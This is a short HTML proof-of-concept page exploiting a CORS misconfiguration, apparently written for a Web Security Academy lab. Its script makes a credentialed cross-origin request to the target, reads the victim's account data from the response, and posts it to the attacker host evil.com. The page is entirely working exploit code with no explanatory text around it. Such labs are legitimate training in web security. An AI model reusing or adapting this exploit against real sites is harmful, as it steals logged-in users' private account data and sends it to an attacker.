<!DOCTYPE html>
<html>
<body>
  <button type="button" onclick="cors()">CORS</button>
  <p id="demo"></p>
  
  <script>
    function cors() {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          var a = this.responseText; // Sensitive data from niche.co about user account
          document.getElementById("demo").innerHTML = a;
          
          var xhttp2 = new XMLHttpRequest();
          xhttp2.open("POST", "http://evil.com", true); // Sending that data to Attacker's website
          xhttp2.withCredentials = true;
          console.log(a);
          xhttp2.send("data=" + a);
        }
      };
      
      xhttp.open("GET", "https://web-security-academy.net", true);
      xhttp.withCredentials = true;
      xhttp.send();
    }
  </script>
</body>
</html>
